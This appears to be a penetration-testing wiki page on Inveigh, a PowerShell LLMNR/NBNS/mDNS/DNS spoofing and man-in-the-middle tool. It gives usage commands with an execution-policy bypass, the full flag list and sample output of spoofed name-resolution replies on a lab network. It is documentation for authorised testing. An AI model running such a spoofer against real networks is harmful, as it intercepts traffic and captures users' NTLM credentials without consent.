---
title : "Inveigh"
# pre : ' '
description : "A PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer and man-in-the-middle tool designed to assist penetration testers/red teamers that find themselves limited to a Windows system."
date : 2020-07-24T13:16:33+02:00
# hidden : true
# draft : true
weight : 170
# tags : ['']
---

---

A PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer and man-in-the-middle tool designed to assist penetration testers/red teamers that find themselves limited to a Windows system.

## Installation

Download newest release from [Github.com](https://github.com/Kevin-Robertson/Inveigh)

### Included in

```plain
PowerShell Empire - https://github.com/PowerShellEmpire/Empire
PS>Attack - https://github.com/jaredhaight/psattack
p0wnedShell - https://github.com/Cn33liz/p0wnedShell
PowerUpSQL - https://github.com/NetSPI/PowerUpSQL
PoshC2 - https://github.com/nettitude/PoshC2
pupy - https://github.com/n1nj4sec/pupy
Merlin - https://github.com/Ne0nd0g/merlin
```

## Usage

```powershell
Set-ExecutionPolicy -scope process -execution bypass
Import-Module .\Inveigh.psd1
Invoke-Inveigh -ConsoleOutput Y
```

## Flags

```plain
NAME
    Invoke-Inveigh

SYNOPSIS
    This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer.

SYNTAX
    Invoke-Inveigh [[-ADIDNSHostsIgnore] <Array>] [[-KerberosHostHeader] <Array>] [[-ProxyIgnore] <Array>] [[-PcapTCP] <Array>] [[-PcapUDP] <Array>] [[-SpooferHostsReply] <Array>] [[-SpooferHostsIgnore] <Array>] [[-SpooferIPsReply] <Array>] [[-SpooferIPsIgnore]
    <Array>] [[-WPADDirectHosts] <Array>] [[-WPADAuthIgnore] <Array>] [[-ConsoleQueueLimit] <Int32>] [[-ConsoleStatus] <Int32>] [[-ADIDNSThreshold] <Int32>] [[-ADIDNSTTL] <Int32>] [[-DNSTTL] <Int32>] [[-HTTPPort] <Int32>] [[-HTTPSPort] <Int32>] [[-KerberosCount]
    <Int32>] [[-LLMNRTTL] <Int32>] [[-mDNSTTL] <Int32>] [[-NBNSTTL] <Int32>] [[-NBNSBruteForcePause] <Int32>] [[-ProxyPort] <Int32>] [[-RunCount] <Int32>] [[-RunTime] <Int32>] [[-WPADPort] <Int32>] [[-SpooferLearningDelay] <Int32>] [[-SpooferLearningInterval] <Int32>]
    [[-SpooferThresholdHost] <Int32>] [[-SpooferThresholdNetwork] <Int32>] [[-ADIDNSDomain] <String>] [[-ADIDNSDomainController] <String>] [[-ADIDNSForest] <String>] [[-ADIDNSNS] <String>] [[-ADIDNSNSTarget] <String>] [[-ADIDNSZone] <String>] [[-HTTPBasicRealm]
    <String>] [[-HTTPContentType] <String>] [[-HTTPDefaultFile] <String>] [[-HTTPDefaultEXE] <String>] [[-HTTPResponse] <String>] [[-HTTPSCertIssuer] <String>] [[-HTTPSCertSubject] <String>] [[-NBNSBruteForceHost] <String>] [[-WPADResponse] <String>] [[-Challenge]
    <String>] [[-ConsoleUnique] <String>] [[-ADIDNS] <Array>] [[-ADIDNSPartition] <String>] [[-ADIDNSACE] <String>] [[-ADIDNSCleanup] <String>] [[-DNS] <String>] [[-EvadeRG] <String>] [[-FileOutput] <String>] [[-FileUnique] <String>] [[-HTTP] <String>] [[-HTTPS]
    <String>] [[-HTTPSForceCertDelete] <String>] [[-Kerberos] <String>] [[-LLMNR] <String>] [[-LogOutput] <String>] [[-MachineAccounts] <String>] [[-mDNS] <String>] [[-NBNS] <String>] [[-NBNSBruteForce] <String>] [[-OutputStreamOnly] <String>] [[-Proxy] <String>]
    [[-ShowHelp] <String>] [[-SMB] <String>] [[-SpooferLearning] <String>] [[-SpooferNonprintable] <String>] [[-SpooferRepeat] <String>] [[-StatusOutput] <String>] [[-StartupChecks] <String>] [[-ConsoleOutput] <String>] [[-Elevated] <String>] [[-HTTPAuth] <String>]
    [[-mDNSTypes] <Array>] [[-NBNSTypes] <Array>] [[-Pcap] <String>] [[-ProxyAuth] <String>] [[-Tool] <String>] [[-WPADAuth] <String>] [[-KerberosHash] <String>] [[-FileOutputDirectory] <String>] [[-HTTPDirectory] <String>] [[-HTTPIP] <String>] [[-IP] <String>]
    [[-NBNSBruteForceTarget] <String>] [[-ProxyIP] <String>] [[-SpooferIP] <String>] [[-WPADIP] <String>] [[-ADIDNSCredential] <PSCredential>] [[-KerberosCredential] <PSCredential>] [-Inspect] [[-invalid_parameter] <Object>] [<CommonParameters>]


DESCRIPTION
    This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer/man-in-the-middle tool with
    challenge/response capture over HTTP/HTTPS/Proxy/SMB.


RELATED LINKS
    https://github.com/Kevin-Robertson/Inveigh

REMARKS
    To see the examples, type: "get-help Invoke-Inveigh -examples".
    For more information, type: "get-help Invoke-Inveigh -detailed".
    For technical information, type: "get-help Invoke-Inveigh -full".
    For online help, type: "get-help Invoke-Inveigh -online"
```

## Examples

```powershell
PS C:\Users\JOHNDO\Inveigh> Set-ExecutionPolicy -scope process -execution bypass
PS C:\Users\JOHNDO\Inveigh> Import-Module .\Inveigh.psd1
PS C:\Users\JOHNDO\Inveigh> Invoke-Inveigh -ConsoleOutput Y
[*] Inveigh 1.504 started at 2020-07-24T13:22:53
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 10.10.10.48
[+] Spoofer IP Address = 10.10.10.48
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Disabled
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
[+] [2020-07-24T13:23:46] LLMNR request for WS7-2 received from 10.10.10.15 [response sent]
[+] [2020-07-24T13:23:46] LLMNR request for isatap received from 10.10.10.15 [response sent]
[+] [2020-07-24T13:23:46] LLMNR request for isatap received from 10.10.10.15 [response sent]
[+] [2020-07-24T13:23:46] LLMNR request for isatap received from 10.10.10.15 [response sent]
[+] [2020-07-24T13:23:48] LLMNR request for isatap received from 10.10.10.15 [response sent]
[+] [2020-07-24T13:23:50] LLMNR request for wpad received from 10.10.10.15 [response sent]
[+] [2020-07-24T13:23:50] TCP(80) SYN packet detected from 10.10.10.15:49156
[+] [2020-07-24T13:23:50] HTTP(80) GET request for /wpad.dat received from 10.10.10.15:49156
[+] [2020-07-24T13:23:50] HTTP(80) host header 10.10.10.48 received from 10.10.10.15:49156
[+] [2020-07-24T13:23:50] TCP(80) SYN packet detected from 10.10.10.15:49157
[+] [2020-07-24T13:23:50] TCP(80) SYN packet detected from 10.10.10.15:49158
[+] [2020-07-24T13:24:09] LLMNR request for WS7 received from 10.10.10.13 [response sent]
[+] [2020-07-24T13:24:10] NBNS request for OFFSEC<1C> received from 10.10.10.16 [spoofer disabled]
[+] [2020-07-24T13:24:10] LLMNR request for isatap received from 10.10.10.16 [response sent]
[+] [2020-07-24T13:24:11] LLMNR request for DC2008R2 received from 10.10.10.16 [response sent]
```

## URL List

- [Github.com - Inveigh](https://github.com/Kevin-Robertson/Inveigh)
- [Github.com - Inveigh - Wiki](https://github.com/Kevin-Robertson/Inveigh/wiki)
